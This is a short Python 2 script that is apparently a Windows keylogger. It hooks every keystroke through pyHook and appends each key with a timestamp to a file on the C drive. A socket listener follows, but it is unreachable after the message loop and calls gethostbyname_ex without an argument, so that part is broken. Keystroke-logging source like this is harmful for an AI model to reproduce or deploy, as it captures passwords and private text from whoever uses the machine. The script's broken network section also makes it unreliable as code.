import sys
import socket
import win32com
import pythoncom
import pyHook
import datetime

print("--------------------Monitor will start immediately------------------------")
print("--------------------------------------------------------------------------")
print("-------------------Writes file to C drive called mono.txt-----------------")

__today = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def onKeyboardEvent(event):
    monitor = chr(event.Ascii)
    print "Key: ", chr(event.Ascii)
    monitor = __today + "Key:"+ '\t'+ "[" + monitor +"]" +'\n'

    fil = open("C:\\mono.txt", "a")
    fil.write(monitor)
    fil.close()
    return True #,return x

hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages() #will wait forever


sock = socket.socket()              #Initiate socket
host = socket.gethostbyname_ex()    #Get the host name
port = 12345                        #Reserve this port
sock.bind((host, port))             #Bind to the port

sock.listen(5)
while True:
    client, address = sock.accept() #Establish connection
    print "Got connection from", address
    client.send("Thanks for testing me")
    #client.close #do not uncomment unless you need to monitor for a brief monitor
